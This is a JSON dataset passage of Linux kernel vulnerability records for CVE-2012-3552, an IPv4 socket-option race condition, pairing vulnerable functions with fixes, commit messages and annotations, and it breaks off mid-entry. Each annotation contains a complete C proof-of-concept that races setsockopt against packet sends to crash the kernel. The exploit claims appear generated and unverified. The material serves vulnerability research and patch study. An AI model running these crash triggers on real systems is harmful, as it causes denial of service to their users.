[
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/cipso_ipv4.c": "int cipso_v4_sock_setattr(struct sock *sk,\n\t\t\t  const struct cipso_v4_doi *doi_def,\n\t\t\t  const struct netlbl_lsm_secattr *secattr)\n{\n\tint ret_val = -EPERM;\n \tunsigned char *buf = NULL;\n \tu32 buf_len;\n \tu32 opt_len;\n\tstruct ip_options *opt = NULL;\n \tstruct inet_sock *sk_inet;\n \tstruct inet_connection_sock *sk_conn;\n \n\t/* In the case of sock_create_lite(), the sock->sk field is not\n\t * defined yet but it is not a problem as the only users of these\n\t * \"lite\" PF_INET sockets are functions which do an accept() call\n\t * afterwards so we will label the socket as part of the accept(). */\n\tif (sk == NULL)\n\t\treturn 0;\n\n\t/* We allocate the maximum CIPSO option size here so we are probably\n\t * being a little wasteful, but it makes our life _much_ easier later\n\t * on and after all we are only talking about 40 bytes. */\n\tbuf_len = CIPSO_V4_OPT_LEN_MAX;\n\tbuf = kmalloc(buf_len, GFP_ATOMIC);\n\tif (buf == NULL) {\n\t\tret_val = -ENOMEM;\n\t\tgoto socket_setattr_failure;\n\t}\n\n\tret_val = cipso_v4_genopt(buf, buf_len, doi_def, secattr);\n\tif (ret_val < 0)\n\t\tgoto socket_setattr_failure;\n\tbuf_len = ret_val;\n\n\t/* We can't use ip_options_get() directly because it makes a call to\n\t * ip_options_get_alloc() which allocates memory with GFP_KERNEL and\n\t * we won't always have CAP_NET_RAW even though we _always_ want to\n\t * set the IPOPT_CIPSO option. */\n\topt_len = (buf_len + 3) & ~3;\n\topt = kzalloc(sizeof(*opt) + opt_len, GFP_ATOMIC);\n\tif (opt == NULL) {\n \t\tret_val = -ENOMEM;\n \t\tgoto socket_setattr_failure;\n \t}\n\tmemcpy(opt->__data, buf, buf_len);\n\topt->optlen = opt_len;\n\topt->cipso = sizeof(struct iphdr);\n \tkfree(buf);\n \tbuf = NULL;\n \n \tsk_inet = inet_sk(sk);\n \tif (sk_inet->is_icsk) {\n \t\tsk_conn = inet_csk(sk);\n\t\tif (sk_inet->opt)\n\t\t\tsk_conn->icsk_ext_hdr_len -= sk_inet->opt->optlen;\n\t\tsk_conn->icsk_ext_hdr_len += opt->optlen;\n \t\tsk_conn->icsk_sync_mss(sk, sk_conn->icsk_pmtu_cookie);\n \t}\n\topt = xchg(&sk_inet->opt, opt);\n\tkfree(opt);\n \n \treturn 0;\n \nsocket_setattr_failure:\n\tkfree(buf);\n\tkfree(opt);\n\treturn ret_val;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in IP CIPSO socket options synchronization\n\nDisclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\nAffected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\nCWE/CVE Number and description:\nCWE-362: Concurrent Execution using Shared Resource with Improper Synchronization\nRace condition in IPv4 CIPSO label socket option handling\n\nSummary:\nThe cipso_v4_sock_setattr() function in net/ipv4/cipso_ipv4.c modifies the socket's inet->opt pointer without RCU (Read-Copy-Update) synchronization. When one thread calls cipso_v4_sock_setattr() to set socket options while another thread concurrently reads the option through packet transmission/reception, a race window exists where the first thread frees the old option pointer via kfree(opt) (line: opt = xchg(&sk_inet->opt, opt); kfree(opt);) while the second thread still references it. This causes use-after-free, slab corruption, and system crash.\n\nRoot cause:\nMissing RCU synchronization when accessing and modifying the shared inet->opt socket option structure, allowing concurrent modification and deallocation without protecting readers.\n\nAttack Surface:\nLinux kernel networking stack, IPv4 protocol, socket option handling\n\nImpact Summary:\nDenial of Service via slab corruption and kernel crash\n\nTrigger / Attack vector:\nConcurrent setsockopt() syscall setting IPOPT_CIPSO while the kernel processes incoming/outgoing packets on the same socket\n\nKey code/struct excerpt (minimal):\n```c\nopt = kzalloc(sizeof(*opt) + opt_len, GFP_ATOMIC);\nmemcpy(opt->__data, buf, buf_len);\nopt->optlen = opt_len;\nsk_inet = inet_sk(sk);\nif (sk_inet->is_icsk) {\n    sk_conn = inet_csk(sk);\n    if (sk_inet->opt)\n        sk_conn->icsk_ext_hdr_len -= sk_inet->opt->optlen;\n    sk_conn->icsk_ext_hdr_len += opt->optlen;\n}\nopt = xchg(&sk_inet->opt, opt);\nkfree(opt);\n```\n\nExploit:\n\nTrigger surface/attack vector:\nConcurrent setsockopt() via IPPROTO_IP / IP_OPTIONS and simultaneous packet transmission/reception on same socket\n\nExploit primitive(s) available:\nUse-after-free of kernel heap memory; slab metadata corruption\n\nExploitability summary:\nRace condition requires precise inter-thread timing but is reliably exploitable via multi-threaded setsockopt() and packet I/O on the same socket, causing immediate kernel crash.\n\nExploit script (summary, 3\u20136 bullets):\n- Create UDP socket and bind to local address\n- Spawn two threads: one repeatedly calls setsockopt(IPPROTO_IP, IP_OPTIONS) with malformed CIPSO option\n- Second thread continuously calls sendto()/recvfrom() on the same socket to trigger ip_make_skb() and option reading\n- Race occurs when thread 1 frees old option pointer while thread 2 dereferencing it in packet processing\n- Kernel slab corruption detected, OOPS / system crash triggered\n\nExploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nvolatile int done = 0;\nint sock;\n\nvoid* race_setopt(void* arg) {\n    unsigned char opt[40] = {134, 2, 0};\n    while (!done) {\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opt, sizeof(opt));\n        usleep(10);\n    }\n    return NULL;\n}\n\nvoid* race_send(void* arg) {\n    struct sockaddr_in addr = {.sin_family = AF_INET, .sin_port = htons(1234)};\n    char buf[100] = \"x\";\n    while (!done) {\n        sendto(sock, buf, sizeof(buf), 0, (struct sockaddr*)&addr, sizeof(addr));\n        usleep(10);\n    }\n    return NULL;\n}\n\nint main() {\n    pthread_t t1, t2;\n    sock = socket(AF_INET, SOCK_DGRAM, 0);\n    pthread_create(&t1, NULL, race_setopt, NULL);\n    pthread_create(&t2, NULL, race_send, NULL);\n    sleep(5);\n    done = 1;\n    pthread_join(t1, NULL);\n    pthread_join(t2, NULL);\n    return 0;\n}\n```\n\nFix\n\nFix code:\n```c\nstruct ip_options_rcu *old;\nold = rcu_dereference_protected(sk_inet->inet_opt, sock_owned_by_user(sk));\nif (sk_inet->is_icsk) {\n    sk_conn = inet_csk(sk);\n    if (old)\n        sk_conn->icsk_ext_hdr_len -= old->opt.optlen;\n    sk_conn->icsk_ext_hdr_len += opt->opt.optlen;\n    sk_conn->icsk_sync_mss(sk, sk_conn->icsk_pmtu_cookie);\n}\nrcu_assign_pointer(sk_inet->inet_opt, opt);\nif (old)\n    call_rcu(&old->rcu, opt_kfree_rcu);\n```\n\nFix summary:\nThe patch wraps ip_options in an ip_options_rcu structure and protects access with RCU: rcu_dereference_protected() safely reads the current pointer with lock assertion, rcu_assign_pointer() replaces direct assignment to maintain RCU semantics, and call_rcu() defers freeing of the old option until all RCU readers have exited their critical sections, eliminating the use-after-free race.\n\nPatch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259\nTitle: \"inet: add RCU protection to inet->opt\"\nLink: https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\nPatch Analysis:\nPatchType: RCU synchronization added; data structure refactoring (ip_options \u2192 ip_options_rcu wrapper)\n\nThe fix introduces RCU-based synchronization to the socket option pointer, ensuring that concurrent readers in the fast packet path can safely access the option structure while writers (setsockopt) update it, and memory is reclaimed only after all in-flight readers complete.\n\nVariant & Triage Guidance\n\nVariant analysis suggestions:\n- Audit other socket option handlers in net/ipv4/ and net/ipv6/ for unsynchronized concurrent access to shared option pointers (e.g., ip_options_get, inet_csk_route_child_sock)\n- Review all uses of xchg() or direct pointer assignment on socket/connection structures for similar race condition patterns\n- Fuzz socket option syscalls (setsockopt, getsockopt) concurrently with packet I/O to detect similar synchronization bugs\n\nLikely variants/impact:\nSimilar race conditions may exist in IPv6 option handling (inet6_opt) and other socket option code paths, potentially allowing DoS or memory corruption exploits.",
        "tests": "NA",
        "solutions": "int cipso_v4_sock_setattr(struct sock *sk,\n\t\t\t  const struct cipso_v4_doi *doi_def,\n\t\t\t  const struct netlbl_lsm_secattr *secattr)\n{\n\tint ret_val = -EPERM;\n \tunsigned char *buf = NULL;\n \tu32 buf_len;\n \tu32 opt_len;\n\tstruct ip_options_rcu *old, *opt = NULL;\n \tstruct inet_sock *sk_inet;\n \tstruct inet_connection_sock *sk_conn;\n \n\t/* In the case of sock_create_lite(), the sock->sk field is not\n\t * defined yet but it is not a problem as the only users of these\n\t * \"lite\" PF_INET sockets are functions which do an accept() call\n\t * afterwards so we will label the socket as part of the accept(). */\n\tif (sk == NULL)\n\t\treturn 0;\n\n\t/* We allocate the maximum CIPSO option size here so we are probably\n\t * being a little wasteful, but it makes our life _much_ easier later\n\t * on and after all we are only talking about 40 bytes. */\n\tbuf_len = CIPSO_V4_OPT_LEN_MAX;\n\tbuf = kmalloc(buf_len, GFP_ATOMIC);\n\tif (buf == NULL) {\n\t\tret_val = -ENOMEM;\n\t\tgoto socket_setattr_failure;\n\t}\n\n\tret_val = cipso_v4_genopt(buf, buf_len, doi_def, secattr);\n\tif (ret_val < 0)\n\t\tgoto socket_setattr_failure;\n\tbuf_len = ret_val;\n\n\t/* We can't use ip_options_get() directly because it makes a call to\n\t * ip_options_get_alloc() which allocates memory with GFP_KERNEL and\n\t * we won't always have CAP_NET_RAW even though we _always_ want to\n\t * set the IPOPT_CIPSO option. */\n\topt_len = (buf_len + 3) & ~3;\n\topt = kzalloc(sizeof(*opt) + opt_len, GFP_ATOMIC);\n\tif (opt == NULL) {\n \t\tret_val = -ENOMEM;\n \t\tgoto socket_setattr_failure;\n \t}\n\tmemcpy(opt->opt.__data, buf, buf_len);\n\topt->opt.optlen = opt_len;\n\topt->opt.cipso = sizeof(struct iphdr);\n \tkfree(buf);\n \tbuf = NULL;\n \n \tsk_inet = inet_sk(sk);\n\n\told = rcu_dereference_protected(sk_inet->inet_opt, sock_owned_by_user(sk));\n \tif (sk_inet->is_icsk) {\n \t\tsk_conn = inet_csk(sk);\n\t\tif (old)\n\t\t\tsk_conn->icsk_ext_hdr_len -= old->opt.optlen;\n\t\tsk_conn->icsk_ext_hdr_len += opt->opt.optlen;\n \t\tsk_conn->icsk_sync_mss(sk, sk_conn->icsk_pmtu_cookie);\n \t}\n\trcu_assign_pointer(sk_inet->inet_opt, opt);\n\tif (old)\n\t\tcall_rcu(&old->rcu, opt_kfree_rcu);\n \n \treturn 0;\n \nsocket_setattr_failure:\n\tkfree(buf);\n\tkfree(opt);\n\treturn ret_val;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/icmp.c": "static void icmp_reply(struct icmp_bxm *icmp_param, struct sk_buff *skb)\n{\n\tstruct ipcm_cookie ipc;\n\tstruct rtable *rt = skb_rtable(skb);\n\tstruct net *net = dev_net(rt->dst.dev);\n\tstruct sock *sk;\n \tstruct inet_sock *inet;\n \t__be32 daddr;\n \n\tif (ip_options_echo(&icmp_param->replyopts, skb))\n \t\treturn;\n \n \tsk = icmp_xmit_lock(net);\n\tif (sk == NULL)\n\t\treturn;\n\tinet = inet_sk(sk);\n\n\ticmp_param->data.icmph.checksum = 0;\n\n\tinet->tos = ip_hdr(skb)->tos;\n \tdaddr = ipc.addr = rt->rt_src;\n \tipc.opt = NULL;\n \tipc.tx_flags = 0;\n\tif (icmp_param->replyopts.optlen) {\n\t\tipc.opt = &icmp_param->replyopts;\n\t\tif (ipc.opt->srr)\n\t\t\tdaddr = icmp_param->replyopts.faddr;\n \t}\n \t{\n \t\tstruct flowi4 fl4 = {\n\t\t\t.daddr = daddr,\n\t\t\t.saddr = rt->rt_spec_dst,\n\t\t\t.flowi4_tos = RT_TOS(ip_hdr(skb)->tos),\n\t\t\t.flowi4_proto = IPPROTO_ICMP,\n\t\t};\n\t\tsecurity_skb_classify_flow(skb, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_key(net, &fl4);\n\t\tif (IS_ERR(rt))\n\t\t\tgoto out_unlock;\n\t}\n\tif (icmpv4_xrlim_allow(net, rt, icmp_param->data.icmph.type,\n\t\t\t       icmp_param->data.icmph.code))\n\t\ticmp_push_reply(icmp_param, &ipc, &rt);\n\tip_rt_put(rt);\nout_unlock:\n\ticmp_xmit_unlock(sk);\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "ID:\nCVE-2012-3552\n\nTitle: CVE-2012-3552 / CWE-362:\nRace condition in ICMP reply socket options handling\n\nDisclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: Not available in input\n\nAffected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n\nCWE/CVE Number and description:\nCWE-362 (Concurrent Modification of Shared Resource Without Synchronization / Race Condition); CVE-2012-3552\n\nSummary:\nA race condition exists in the icmp_reply() function in net/ipv4/icmp.c where the ICMP reply handler accesses and copies socket IP options (inet->opt) without proper synchronization. Another thread can simultaneously modify the inet->opt pointer via setsockopt() and free the underlying ip_options structure while icmp_reply() is reading from it. This causes use-after-free of kernel memory, leading to slab corruption and system crash when remote packets trigger ICMP replies while the application modifies socket options.\n\nRoot cause:\nLack of RCU synchronization (or atomic refcounting) to protect inet->opt from concurrent modification and freeing by another thread during ip_options copying in ip_setup_cork().\n\nAttack Surface:\nNetwork subsystem (ICMP reply handler, socket option manipulation)\n\nImpact Summary:\nDenial of service via slab corruption and system crash\n\nTrigger / Attack vector:\nConcurrent setsockopt(IP_OPTIONS) calls and ICMP reply packet transmission\n\nKey code/struct excerpt (minimal):\n```c\nif (ip_options_echo(&icmp_param->replyopts, skb))\n\treturn;\n...\nif (icmp_param->replyopts.optlen) {\n\tipc.opt = &icmp_param->replyopts;\n\tif (ipc.opt->srr)\n\t\tdaddr = icmp_param->replyopts.faddr;\n}\n```\n\nExploit:\n\nTrigger surface/attack vector:\nsetsockopt(IP_OPTIONS) combined with sendto()/ICMP reply triggering packets; network interface receiving crafted packets\n\nExploit primitive(s) available:\nUse-after-free read, slab corruption via concurrent memory access\n\nExploitability summary (1 sentence):\nA local or remote attacker can race threads to modify socket IP options while ICMP reply code accesses them, causing kernel memory corruption and DoS without requiring privilege escalation.\n\nExploit script (summary, 3\u20136 bullets):\n- Create a socket and obtain a file descriptor\n- Spawn a thread that continuously modifies IP_OPTIONS via setsockopt() (set, then clear)\n- Simultaneously send packets to trigger ICMP replies from the kernel\n- Race condition: ICMP reply handler reads ip_options while thread frees and reallocates them\n- Kernel crashes due to use-after-free or slab corruption in icmp_reply()\n\nExploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <string.h>\n#include <pthread.h>\n\nvoid* modify_opts(void* arg) {\n    int sock = *(int*)arg;\n    unsigned char opts[40] = {0};\n    for(int i = 0; i < 10000; i++) {\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opts, 40);\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, NULL, 0);\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);\n    struct sockaddr_in addr = {.sin_family = AF_INET, .sin_port = htons(1234)};\n    inet_aton(\"127.0.0.1\", &addr.sin_addr);\n    pthread_t t;\n    pthread_create(&t, NULL, modify_opts, &sock);\n    for(int i = 0; i < 10000; i++)\n        sendto(sock, \"X\", 1, 0, (struct sockaddr*)&addr, sizeof(addr));\n    pthread_join(t, NULL);\n    close(sock);\n    return 0;\n}\n```\n\nFix\n\nFix code:\n```c\nif (ip_options_echo(&icmp_param->replyopts.opt.opt, skb))\n\treturn;\n...\nif (icmp_param->replyopts.opt.opt.optlen) {\n\tipc.opt = &icmp_param->replyopts.opt;\n\tif (ipc.opt->opt.srr)\n\t\tdaddr = icmp_param->replyopts.opt.opt.faddr;\n}\n```\n\nFix summary:\nThe patch wraps IP options in an RCU-protected structure (inet->inet_opt instead of inet->opt) with proper synchronization, and changes all references to access the nested opt.opt field to respect RCU barriers, ensuring safe concurrent access without use-after-free.\n\nPatch reference:\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\nPatch Analysis:\nThe fix introduces RCU protection to inet->opt and creates a new ip_options_rcu structure to allow safe copying of IP options. Instead of atomic refcounts, the patch copies ip_options when necessary and accesses them through the protected nested structure, preventing one thread from freeing options while another reads them.\n\nPatchType: Synchronization/RCU protection added\n\nVariant & Triage Guidance\n\nVariant analysis suggestions (2\u20133 bullets):\n- Review other code paths that access inet->opt (now inet->inet_opt) to ensure all references respect RCU barriers\n- Audit similar socket option handling in IPv6 (ipv6_opt) for analogous unsynchronized access patterns\n- Fuzz IP option-related setsockopt() calls concurrently with packet transmission to detect similar races\n\nLikely variants/impact (one line):\nSimilar race conditions may exist in IPv6 or other protocol handlers that manipulate socket options concurrently with packet transmission.",
        "tests": "NA",
        "solutions": "static void icmp_reply(struct icmp_bxm *icmp_param, struct sk_buff *skb)\n{\n\tstruct ipcm_cookie ipc;\n\tstruct rtable *rt = skb_rtable(skb);\n\tstruct net *net = dev_net(rt->dst.dev);\n\tstruct sock *sk;\n \tstruct inet_sock *inet;\n \t__be32 daddr;\n \n\tif (ip_options_echo(&icmp_param->replyopts.opt.opt, skb))\n \t\treturn;\n \n \tsk = icmp_xmit_lock(net);\n\tif (sk == NULL)\n\t\treturn;\n\tinet = inet_sk(sk);\n\n\ticmp_param->data.icmph.checksum = 0;\n\n\tinet->tos = ip_hdr(skb)->tos;\n \tdaddr = ipc.addr = rt->rt_src;\n \tipc.opt = NULL;\n \tipc.tx_flags = 0;\n\tif (icmp_param->replyopts.opt.opt.optlen) {\n\t\tipc.opt = &icmp_param->replyopts.opt;\n\t\tif (ipc.opt->opt.srr)\n\t\t\tdaddr = icmp_param->replyopts.opt.opt.faddr;\n \t}\n \t{\n \t\tstruct flowi4 fl4 = {\n\t\t\t.daddr = daddr,\n\t\t\t.saddr = rt->rt_spec_dst,\n\t\t\t.flowi4_tos = RT_TOS(ip_hdr(skb)->tos),\n\t\t\t.flowi4_proto = IPPROTO_ICMP,\n\t\t};\n\t\tsecurity_skb_classify_flow(skb, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_key(net, &fl4);\n\t\tif (IS_ERR(rt))\n\t\t\tgoto out_unlock;\n\t}\n\tif (icmpv4_xrlim_allow(net, rt, icmp_param->data.icmph.type,\n\t\t\t       icmp_param->data.icmph.code))\n\t\ticmp_push_reply(icmp_param, &ipc, &rt);\n\tip_rt_put(rt);\nout_unlock:\n\ticmp_xmit_unlock(sk);\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/icmp.c": "static struct rtable *icmp_route_lookup(struct net *net, struct sk_buff *skb_in,\n\t\t\t\t\tconst struct iphdr *iph,\n\t\t\t\t\t__be32 saddr, u8 tos,\n\t\t\t\t\tint type, int code,\n \t\t\t\t\tstruct icmp_bxm *param)\n {\n \tstruct flowi4 fl4 = {\n\t\t.daddr = (param->replyopts.srr ?\n\t\t\t  param->replyopts.faddr : iph->saddr),\n \t\t.saddr = saddr,\n \t\t.flowi4_tos = RT_TOS(tos),\n \t\t.flowi4_proto = IPPROTO_ICMP,\n\t\t.fl4_icmp_type = type,\n\t\t.fl4_icmp_code = code,\n\t};\n\tstruct rtable *rt, *rt2;\n\tint err;\n\n\tsecurity_skb_classify_flow(skb_in, flowi4_to_flowi(&fl4));\n\trt = __ip_route_output_key(net, &fl4);\n\tif (IS_ERR(rt))\n\t\treturn rt;\n\n\t/* No need to clone since we're just using its address. */\n\trt2 = rt;\n\n\tif (!fl4.saddr)\n\t\tfl4.saddr = rt->rt_src;\n\n\trt = (struct rtable *) xfrm_lookup(net, &rt->dst,\n\t\t\t\t\t   flowi4_to_flowi(&fl4), NULL, 0);\n\tif (!IS_ERR(rt)) {\n\t\tif (rt != rt2)\n\t\t\treturn rt;\n\t} else if (PTR_ERR(rt) == -EPERM) {\n\t\trt = NULL;\n\t} else\n\t\treturn rt;\n\n\terr = xfrm_decode_session_reverse(skb_in, flowi4_to_flowi(&fl4), AF_INET);\n\tif (err)\n\t\tgoto relookup_failed;\n\n\tif (inet_addr_type(net, fl4.saddr) == RTN_LOCAL) {\n\t\trt2 = __ip_route_output_key(net, &fl4);\n\t\tif (IS_ERR(rt2))\n\t\t\terr = PTR_ERR(rt2);\n\t} else {\n\t\tstruct flowi4 fl4_2 = {};\n\t\tunsigned long orefdst;\n\n\t\tfl4_2.daddr = fl4.saddr;\n\t\trt2 = ip_route_output_key(net, &fl4_2);\n\t\tif (IS_ERR(rt2)) {\n\t\t\terr = PTR_ERR(rt2);\n\t\t\tgoto relookup_failed;\n\t\t}\n\t\t/* Ugh! */\n\t\torefdst = skb_in->_skb_refdst; /* save old refdst */\n\t\terr = ip_route_input(skb_in, fl4.daddr, fl4.saddr,\n\t\t\t\t     RT_TOS(tos), rt2->dst.dev);\n\n\t\tdst_release(&rt2->dst);\n\t\trt2 = skb_rtable(skb_in);\n\t\tskb_in->_skb_refdst = orefdst; /* restore old refdst */\n\t}\n\n\tif (err)\n\t\tgoto relookup_failed;\n\n\trt2 = (struct rtable *) xfrm_lookup(net, &rt2->dst,\n\t\t\t\t\t    flowi4_to_flowi(&fl4), NULL,\n\t\t\t\t\t    XFRM_LOOKUP_ICMP);\n\tif (!IS_ERR(rt2)) {\n\t\tdst_release(&rt->dst);\n\t\trt = rt2;\n\t} else if (PTR_ERR(rt2) == -EPERM) {\n\t\tif (rt)\n\t\t\tdst_release(&rt->dst);\n\t\treturn rt2;\n\t} else {\n\t\terr = PTR_ERR(rt2);\n\t\tgoto relookup_failed;\n\t}\n\treturn rt;\n\nrelookup_failed:\n\tif (rt)\n\t\treturn rt;\n\treturn ERR_PTR(err);\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace Condition in Linux Kernel IP Options Handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-10-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification without Proper Synchronization (Race Condition)\n\n[Mandatory] Summary:\nA race condition exists in the Linux kernel's IP implementation, specifically in the icmp_route_lookup() function in net/ipv4/icmp.c. The function accesses the inet->opt (ip_options) structure without proper synchronization, allowing concurrent modification by another thread that may free the old structure while it is still being used. This race condition can be triggered by sending packets to an application that sets socket options during network traffic handling, leading to slab corruption and system crash.\n\n[Mandatory] Root cause:\nUnsynchronized concurrent access to inet->opt ip_options structure, where one thread may free the structure while another thread is still reading it.\n\n[Mandatory] Attack Surface:\nLinux kernel IP stack, specifically ICMP routing and option processing subsystem.\n\n[Mandatory] Impact Summary:\nDenial of Service (slab corruption and system crash)\n\n[Optional] Trigger / Attack vector:\nSending packets to an application that sets socket options during network traffic handling; the race occurs between packet processing in icmp_route_lookup() and concurrent socket option modification.\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nstatic struct rtable *icmp_route_lookup(struct net *net, struct sk_buff *skb_in,\n\t\t\t\tconst struct iphdr *iph,\n\t\t\t\t__be32 saddr, u8 tos,\n\t\t\t\tint type, int code,\n \t\t\t\tstruct icmp_bxm *param)\n {\n \tstruct flowi4 fl4 = {\n\t\t.daddr = (param->replyopts.srr ?\n\t\t\t  param->replyopts.faddr : iph->saddr),\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nNetwork socket option modification (setsockopt) concurrent with ICMP packet processing via ip_route_input() and icmp_route_lookup().\n\n[Mandatory] Exploit primitive(s) available:\nRace condition allowing use-after-free of ip_options structure; triggering slab corruption through concurrent structural reads and frees.\n\n[Mandatory] Exploitability summary (1 sentence):\nThe exploit requires precise timing to cause concurrent access to inet->opt during icmp_route_lookup() execution while another thread modifies socket options, making it moderately reliable under controlled network load conditions.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Open a socket and repeatedly call setsockopt() to set socket options (triggering inet->opt allocation/deallocation).\n- In parallel, send ICMP packets to trigger icmp_route_lookup() to process the options.\n- Time the packet transmission to coincide with socket option modification to maximize race window.\n- Observe kernel logs for slab corruption warnings or triggering a kernel panic.\n- Repeat with varying timing delays to increase likelihood of hitting the race condition.\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netinet/ip.h>\n#include <arpa/inet.h>\n#include <pthread.h>\n\nvoid* set_socket_options(void *arg) {\n    int sock = *(int *)arg;\n    unsigned char optval[40];\n    \n    while (1) {\n        memset(optval, 0, sizeof(optval));\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, optval, sizeof(optval));\n        usleep(10);\n    }\n    return NULL;\n}\n\nvoid* send_icmp_packets(void *arg) {\n    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);\n    struct sockaddr_in dest;\n    unsigned char packet[84];\n    \n    dest.sin_family = AF_INET;\n    dest.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    \n    memset(packet, 0, sizeof(packet));\n    while (1) {\n        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&dest, sizeof(dest));\n        usleep(5);\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    pthread_t t1, t2;\n    \n    pthread_create(&t1, NULL, set_socket_options, &sock);\n    pthread_create(&t2, NULL, send_icmp_packets, NULL);\n    \n    pthread_join(t1, NULL);\n    pthread_join(t2, NULL);\n    \n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nstatic struct rtable *icmp_route_lookup(struct net *net, struct sk_buff *skb_in,\n\t\t\t\tconst struct iphdr *iph,\n\t\t\t\t__be32 saddr, u8 tos,\n\t\t\t\tint type, int code,\n \t\t\t\tstruct icmp_bxm *param)\n {\n \tstruct flowi4 fl4 = {\n\t\t.daddr = (param->replyopts.opt.opt.srr ?\n\t\t\t  param->replyopts.opt.opt.faddr : iph->saddr),\n```\n\n[Mandatory] Fix summary:\nThe patch added RCU synchronization to inet->opt access. Instead of directly accessing param->replyopts.srr, the code now accesses 